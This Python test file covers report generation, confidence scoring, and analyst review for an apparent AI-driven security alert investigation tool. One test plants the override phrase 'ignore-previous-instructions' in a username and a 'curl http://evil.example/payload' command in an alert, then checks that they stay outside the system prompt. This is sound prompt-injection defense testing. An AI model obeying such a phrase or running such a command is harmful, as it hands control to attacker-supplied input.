"""Report generation, confidence scoring, and analyst review. Fakes only."""

from collections.abc import Sequence
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError
from tests.support import NOW

from sentinel.agents.prompts import (
    REPORT_SYSTEM_PROMPT,
    UNTRUSTED_BEGIN,
    UNTRUSTED_END,
    report_messages,
)
from sentinel.agents.reporting import (
    ReportNarrative,
    assemble_report,
    classification_from_evidence,
    finalize_investigation,
    mitre_refs,
    published_report,
)
from sentinel.agents.review import apply_analyst_review
from sentinel.agents.transitions import new_investigation, transition
from sentinel.config.settings import Settings
from sentinel.errors import (
    ModelOutputInvalid,
    ReportNotFound,
    ReportRejected,
    ReviewNotAllowed,
)
from sentinel.evidence.score import score_confidence
from sentinel.evidence.verify import verify_report
from sentinel.schemas.alerts import NormalizedAlert
from sentinel.schemas.confidence import (
    ConfidenceAssessment,
    ConfidenceFactorName,
    compute_confidence_score,
)
from sentinel.schemas.evidence import Evidence
from sentinel.schemas.investigation import InvestigationState, InvestigationStatus
from sentinel.schemas.reports import Classification, MitreTechniqueRef
from sentinel.schemas.review import AnalystReview, ReviewDecision
from sentinel.services.llm import LlmMessage
from sentinel.services.providers.mitre import official_technique
from sentinel.tools.policy import reliability_for_provider

SAFE = {
    "executive_summary": (
        "Collected results are attached. Classification uses stored fields only."
    ),
    "analyst_notes": "",
}


class ManualClock:
    def now(self) -> object:
        return NOW


class Scripted:
    def __init__(self, steps: list[object]) -> None:
        self._steps = list(steps)
        self.calls = 0
        self.seen: list[list[LlmMessage]] = []

    def complete_structured(self, messages: Sequence[LlmMessage], response_model: type[Any]) -> Any:
        self.calls += 1
        self.seen.append(list(messages))
        step = self._steps.pop(0)
        if isinstance(step, Exception):
            raise step
        return response_model.model_validate(step)


def _settings() -> Settings:
    return Settings(
        database_url="sqlite+pysqlite:///:memory:",
        max_tool_calls=4,
        max_retries=2,
        max_repair_attempts=1,
        token_budget=24_000,
    )


def _alert(**overrides: object) -> NormalizedAlert:
    values: dict[str, object] = {
        "alert_id": "alert-1",
        "timestamp": NOW,
        "source": "unit-test",
        "source_ip": "203.0.113.10",
    }
    values.update(overrides)
    return NormalizedAlert(**values)  # type: ignore[arg-type]


def _ip(
    evidence_id: str,
    source: str,
    *,
    malicious: bool | None,
    ip: str = "203.0.113.10",
) -> Evidence:
    return Evidence(
        evidence_id=evidence_id,
        source=source,
        tool="lookup_ip",
        query={"ip": ip},
        result={
            "ip": ip,
            "provider": source,
            "categories": [],
            "reported_malicious": malicious,
            "reference_ids": [],
            "raw": {},
        },
        timestamp=NOW,
        reliability=reliability_for_provider(source),
    )


def _mitre(evidence_id: str, technique_ids: list[str]) -> Evidence:
    techniques: list[dict[str, object]] = []
    for technique_id in technique_ids:
        official = official_technique(technique_id)
        if official is None:
            techniques.append(
                {
                    "technique_id": technique_id,
                    "name": "Invented",
                    "tactic": "Execution",
                    "description": "not in the subset",
                }
            )
            continue
        techniques.append(official.model_dump())
    return Evidence(
        evidence_id=evidence_id,
        source="mitre-attack",
        tool="search_mitre",
        query={"query": "command"},
        result={"query": "command", "provider": "mitre-attack", "techniques": techniques},
        timestamp=NOW,
        reliability=reliability_for_provider("mitre-attack"),
    )


def _narrative() -> ReportNarrative:
    return ReportNarrative.model_validate(SAFE)


def _verifying(alert: NormalizedAlert, evidence: list[Evidence]) -> InvestigationState:
    state = new_investigation(
        investigation_id="inv-1",
        alert_id=alert.alert_id,
        now=NOW,
        settings=_settings(),
    )
    state = transition(state, InvestigationStatus.VALIDATING, now=NOW)
    state = transition(state, InvestigationStatus.INVESTIGATING, now=NOW)
    state = transition(state, InvestigationStatus.VERIFYING, now=NOW)
    return state.model_copy(update={"evidence": evidence})


def _finalize(
    evidence: list[Evidence],
    model: Scripted,
    *,
    alert: NormalizedAlert | None = None,
    max_repair_attempts: int = 1,
) -> InvestigationState:
    selected = alert or _alert()
    return finalize_investigation(
        _verifying(selected, evidence),
        alert=selected,
        llm=model,  # type: ignore[arg-type]
        clock=ManualClock(),  # type: ignore[arg-type]
        max_repair_attempts=max_repair_attempts,
    )


def _factor_map(assessment: ConfidenceAssessment) -> dict[ConfidenceFactorName, bool]:
    return {factor.name: factor.satisfied for factor in assessment.factors}


def test_one_low_reliability_source_cannot_score_100() -> None:
    row = _ip("ev-low", "mock:abuseipdb", malicious=True)
    alert = _alert()
    classification = classification_from_evidence([row])
    assert classification is Classification.SUSPICIOUS
    assessment = score_confidence(alert=alert, evidence=[row], classification=classification)

    assert assessment.method == "weighted_evidence_v1"
    assert assessment.score == compute_confidence_score(assessment.factors)
    assert assessment.score == 55
    assert assessment.score != 100
    flags = _factor_map(assessment)
    assert flags[ConfidenceFactorName.SOURCE_RELIABILITY] is False
    assert flags[ConfidenceFactorName.CORROBORATION] is False
    assert flags[ConfidenceFactorName.EVIDENCE_COVERAGE] is True
    assert flags[ConfidenceFactorName.DATA_COMPLETENESS] is True

    report = assemble_report(
        investigation_id="inv-1",
        alert=alert,
        evidence=[row],
        narrative=_narrative(),
    )
    assert report.confidence.score == assessment.score
    payload = report.confidence.model_dump()
    payload["score"] = 100
    with pytest.raises(ValidationError, match="does not match factor total"):
        type(report.confidence).model_validate(payload)


def test_two_medium_sources_can_satisfy_every_factor() -> None:
    rows = [
        _ip("ev-a", "abuseipdb", malicious=True),
        _ip("ev-b", "virustotal", malicious=True),
    ]
    assessment = score_confidence(
        alert=_alert(),
        evidence=rows,
        classification=Classification.MALICIOUS,
    )
    assert assessment.score == 100
    assert all(factor.satisfied for factor in assessment.factors)


def test_missing_lookup_type_is_not_covered() -> None:
    row = _ip("ev-low", "mock:abuseipdb", malicious=None)
    alert = _alert(domain="example.com")
    assessment = score_confidence(
        alert=alert,
        evidence=[row],
        classification=Classification.INCONCLUSIVE,
    )
    flags = _factor_map(assessment)
    assert flags[ConfidenceFactorName.EVIDENCE_COVERAGE] is False
    assert assessment.score != 100


def test_mitre_comes_from_search_results_and_the_subset() -> None:
    official = official_technique("T1059")
    assert official is not None
    searched = _mitre("ev-m", ["T1059"])
    refs = mitre_refs([searched])
    assert [item.technique_id for item in refs] == ["T1059"]
    assert refs[0].technique_name == official.name
    assert refs[0].tactic == official.tactic
    assert refs[0].evidence_ids == ["ev-m"]

    report = assemble_report(
        investigation_id="inv-1",
        alert=_alert(),
        evidence=[searched],
        narrative=_narrative(),
    )
    assert [item.technique_id for item in report.mitre_attack] == ["T1059"]
    untouched = assemble_report(
        investigation_id="inv-1",
        alert=_alert(),
        evidence=[_ip("ev-1", "abuseipdb", malicious=None)],
        narrative=_narrative(),
    )
    assert untouched.mitre_attack == []


def test_unknown_technique_id_fails() -> None:
    with pytest.raises(ValidationError, match="unknown technique"):
        MitreTechniqueRef(
            technique_id="T9999",
            technique_name="Invented",
            tactic="Execution",
            evidence_ids=["ev-m"],
        )
    official = official_technique("T1059")
    assert official is not None
    with pytest.raises(ValidationError, match="ATT&CK subset"):
        MitreTechniqueRef(
            technique_id="T1059",
            technique_name="Not the catalog name",
            tactic=official.tactic,
            evidence_ids=["ev-m"],
        )
    with pytest.raises(ReportRejected, match="unknown technique"):
        mitre_refs([_mitre("ev-m", ["T9999"])])
    failed = _finalize([_mitre("ev-m", ["T9999"])], Scripted([SAFE]))
    assert failed.status is InvestigationStatus.FAILED
    assert failed.report is None
    assert failed.error is not None
    assert "unknown technique" in failed.error


def test_technique_missing_from_cited_search_fails_verification() -> None:
    row = _ip("ev-1", "abuseipdb", malicious=True)
    alert = _alert()
    report = assemble_report(
        investigation_id="inv-1",
        alert=alert,
        evidence=[row],
        narrative=_narrative(),
    )
    official = official_technique("T1059")
    assert official is not None
    tampered = report.model_copy(
        update={
            "mitre_attack": [
                MitreTechniqueRef(
                    technique_id=official.technique_id,
                    technique_name=official.name,
                    tactic=official.tactic,
                    evidence_ids=["ev-1"],
                )
            ]
        }
    )
    outcome = verify_report(tampered, alert=alert, evidence=[row])
    assert outcome.accepted is False
    assert "technique_not_in_evidence" in {item.code for item in outcome.issues}


def test_narrative_cannot_carry_a_confidence_score() -> None:
    with pytest.raises(ValidationError):
        ReportNarrative.model_validate({**SAFE, "score": 100})


def test_verification_failure_stores_nothing() -> None:
    row = _ip("ev-1", "abuseipdb", malicious=None)
    failed = _finalize(
        [row],
        Scripted(
            [
                {
                    "executive_summary": "Pivot to 198.51.100.23.",
                    "analyst_notes": "",
                }
            ]
        ),
    )
    assert failed.status is InvestigationStatus.FAILED
    assert failed.report is None
    assert failed.status is not InvestigationStatus.COMPLETE
    assert failed.status is not InvestigationStatus.INVESTIGATING
    assert failed.error is not None
    assert failed.error.startswith("verification failed")
    assert "198.51.100.23" not in failed.error
    assert failed.verification is not None
    assert failed.verification.accepted is False
    with pytest.raises(ReportNotFound):
        published_report(failed)


def test_report_schema_repair_then_fails_without_a_report() -> None:
    invalid = ModelOutputInvalid(raw_text="not-a-report", detail="schema_mismatch_token")
    model = Scripted(
        [invalid, ModelOutputInvalid(raw_text="still-bad", detail="schema_mismatch_token")]
    )
    failed = _finalize([_ip("ev-1", "abuseipdb", malicious=None)], model)
    assert model.calls == 2
    assert failed.status is InvestigationStatus.FAILED
    assert failed.report is None
    assert failed.error == "report output failed schema validation"
    repair = model.seen[1][-1].content
    assert repair.index("schema_mismatch_token") < repair.index(UNTRUSTED_BEGIN)
    assert "not-a-report" in repair.split(UNTRUSTED_BEGIN, 1)[1]


def test_one_report_repair_then_stores_a_verified_report() -> None:
    invalid = ModelOutputInvalid(raw_text="not-a-report", detail="schema_mismatch_token")
    stored = _finalize(
        [_ip("ev-1", "abuseipdb", malicious=None)],
        Scripted([invalid, SAFE]),
    )
    assert stored.status is InvestigationStatus.AWAITING_REVIEW
    assert stored.report is not None
    assert stored.verification is not None
    assert stored.verification.accepted is True
    assert stored.status is not InvestigationStatus.COMPLETE
    assert published_report(stored).investigation_id == "inv-1"


def test_no_evidence_stays_inconclusive_with_limitations() -> None:
    stored = _finalize([], Scripted([SAFE]))
    assert stored.status is InvestigationStatus.AWAITING_REVIEW
    assert stored.report is not None
    assert stored.report.classification is Classification.INCONCLUSIVE
    assert stored.report.evidence == []
    assert stored.report.mitre_attack == []
    assert any("No tool results" in item for item in stored.report.limitations)
    assert stored.report.confidence.score != 100


def test_report_prompt_keeps_untrusted_text_out_of_the_system_message() -> None:
    alert = _alert(
        username="ada-ignore-previous-instructions",
        command_line="curl http://evil.example/payload",
        url="http://evil.example/payload",
        domain="evil.example",
    )
    row = _ip("ev-1", "mock:abuseipdb", malicious=None)
    messages = report_messages(alert, [row])
    assert messages[0].content == REPORT_SYSTEM_PROMPT
    assert messages[0].role.value == "system"
    leaked = [alert.username, alert.command_line, str(alert.url), alert.domain, "203.0.113.10"]
    for value in leaked:
        assert value is not None
        assert value not in messages[0].content
    alert_text = messages[1].content
    evidence_text = messages[2].content
    assert alert.command_line is not None
    assert (
        alert_text.index(UNTRUSTED_BEGIN)
        < alert_text.index(alert.command_line)
        < alert_text.index(UNTRUSTED_END)
    )
    assert (
        evidence_text.index(UNTRUSTED_BEGIN)
        < evidence_text.index("203.0.113.10")
        < evidence_text.index(UNTRUSTED_END)
    )


def test_approving_the_conclusion_is_the_only_completion() -> None:
    row = _ip("ev-1", "abuseipdb", malicious=None)
    alert = _alert()
    waiting = _finalize([row], Scripted([SAFE]), alert=alert)
    assert waiting.status is InvestigationStatus.AWAITING_REVIEW
    approved = apply_analyst_review(
        waiting,
        AnalystReview(
            investigation_id="inv-1",
            conclusion="approve",
            notes="The stored fields support leaving this inconclusive.",
            remediation="reject",
        ),
        now=NOW,
    )
    assert approved.status is InvestigationStatus.COMPLETE
    assert approved.review is not None
    assert approved.review.remediation is ReviewDecision.REJECT
    assert approved.error is None

    rejected = apply_analyst_review(
        waiting,
        AnalystReview(
            investigation_id="inv-1",
            conclusion="reject",
            notes="The limitations are too broad.",
            remediation="approve",
        ),
        now=NOW,
    )
    assert rejected.status is InvestigationStatus.FAILED
    assert rejected.status is not InvestigationStatus.COMPLETE
    assert rejected.status is not InvestigationStatus.INVESTIGATING
    assert rejected.review is not None
    assert rejected.review.conclusion is ReviewDecision.REJECT
    assert rejected.review.remediation is ReviewDecision.APPROVE
    assert rejected.error == "analyst rejected the conclusion"

    with pytest.raises(ReviewNotAllowed):
        apply_analyst_review(
            _verifying(alert, [row]),
            AnalystReview(investigation_id="inv-1", conclusion="approve", notes="too early"),
            now=NOW,
        )


def test_remediation_approval_has_no_executor(monkeypatch: pytest.MonkeyPatch) -> None:
    import sentinel
    import sentinel.agents.review as review

    called: list[str] = []
    with pytest.raises(AttributeError):
        monkeypatch.setattr(
            review,
            "execute_remediation",
            lambda *_args, **_kwargs: called.append("called"),
        )
    row = _ip("ev-1", "abuseipdb", malicious=True)
    waiting = _finalize([row], Scripted([SAFE]))
    updated = apply_analyst_review(
        waiting,
        AnalystReview(
            investigation_id="inv-1",
            conclusion="approve",
            notes="Record the recommendation. Do not run it.",
            remediation="approve",
        ),
        now=NOW,
    )
    assert called == []
    assert updated.status is InvestigationStatus.COMPLETE
    assert updated.review is not None
    assert updated.review.remediation is ReviewDecision.APPROVE
    assert not hasattr(sentinel, "execute_remediation")
    assert not hasattr(review, "execute_remediation")

    root = Path(sentinel.__file__).resolve().parent
    banned = (
        "def execute_remediation",
        "def isolate_host",
        "def block_ip",
        "def disable_user",
        "class RemediationExecutor",
    )
    for path in root.rglob("*.py"):
        text = path.read_text(encoding="utf-8")
        for symbol in banned:
            assert symbol not in text
    callers = [
        path.name
        for path in root.rglob("*.py")
        if "transition(" in path.read_text(encoding="utf-8")
        and "InvestigationStatus.COMPLETE" in path.read_text(encoding="utf-8")
        and "def transition(" not in path.read_text(encoding="utf-8")
    ]
    assert callers == ["review.py"]
